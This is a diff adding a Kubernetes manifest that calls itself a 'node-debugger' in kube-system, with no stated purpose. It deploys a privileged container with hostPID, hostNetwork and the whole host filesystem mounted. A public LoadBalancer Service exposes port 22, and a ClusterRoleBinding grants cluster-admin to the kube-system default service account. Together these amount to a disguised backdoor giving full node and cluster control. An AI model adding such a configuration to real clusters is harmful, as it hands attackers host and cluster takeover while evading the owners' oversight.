@@ -1,0 +1,71 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: node-debugger
+  namespace: kube-system
+
+spec:
+  replicas: 1
+
+  selector:
+    matchLabels:
+      app: node-debugger
+
+  template:
+    metadata:
+      labels:
+        app: node-debugger
+
+    spec:
+      hostPID: true
+      hostNetwork: true
+
+      containers:
+        - name: debugger
+          image: ubuntu:latest
+          command: ["sleep", "999999"]
+
+          securityContext:
+            privileged: true
+
+          volumeMounts:
+            - name: host-root
+              mountPath: /host
+
+      volumes:
+        - name: host-root
+          hostPath:
+            path: /
+
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: debugger-service
+  namespace: kube-system
+
+spec:
+  type: LoadBalancer
+
+  selector:
+    app: node-debugger
+
+  ports:
+    - port: 22
+      targetPort: 22
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: debug-admin
+
+subjects:
+  - kind: ServiceAccount
+    name: default
+    namespace: kube-system
+
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
+  apiGroup: rbac.authorization.k8s.io
